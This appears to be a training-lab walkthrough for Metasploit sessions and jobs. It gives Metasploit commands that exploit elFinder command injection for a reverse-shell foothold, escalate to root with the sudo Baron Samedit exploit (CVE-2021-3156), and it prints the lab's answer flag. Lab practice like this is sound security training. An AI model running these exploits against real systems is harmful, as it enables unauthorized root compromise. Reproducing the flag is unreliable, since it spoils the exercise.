# Module 39 — Using The Metasploit Framework
## Section 10: Sessions & Jobs

**Target:** Linux box running elFinder

**Step 1 — initial foothold (www-data):**
```
use exploit/linux/http/elfinder_archive_cmd_injection
set RHOSTS <target>
set LHOST <your-tun0-ip>
exploit
```

**Step 2 — privilege escalation to root:**
```
use exploit/linux/local/sudo_baron_samedit   # CVE-2021-3156 (sudo heap overflow)
set SESSION <session-id-from-step-1>
exploit
```

**Flag:** `HTB{5e55ion5_4r3_sw33t}`
